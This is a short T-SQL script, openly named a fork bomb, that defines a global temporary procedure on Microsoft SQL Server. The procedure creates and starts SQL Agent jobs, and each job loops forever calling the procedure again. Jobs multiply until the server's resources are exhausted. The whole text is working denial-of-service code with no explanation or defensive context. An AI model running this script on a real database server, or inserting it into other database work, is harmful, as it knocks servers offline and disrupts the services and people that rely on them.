CREATE PROC ##ForkBomb AS
BEGIN
DECLARE @GUID UNIQUEIDENTIFIER = NEWID();
EXEC msdb.dbo.sp_add_job @job_name = @GUID;
EXEC msdb.dbo.sp_add_jobstep @job_name = @GUID, @step_id = 1, @step_name = 'Uno', @command = 'WHILE 1 = 1 EXEC ##ForkBomb;', @database_name = 'msdb';
EXEC msdb.dbo.sp_add_jobserver @job_name = @GUID;
EXEC msdb.dbo.sp_start_job @job_name = @GUID;
END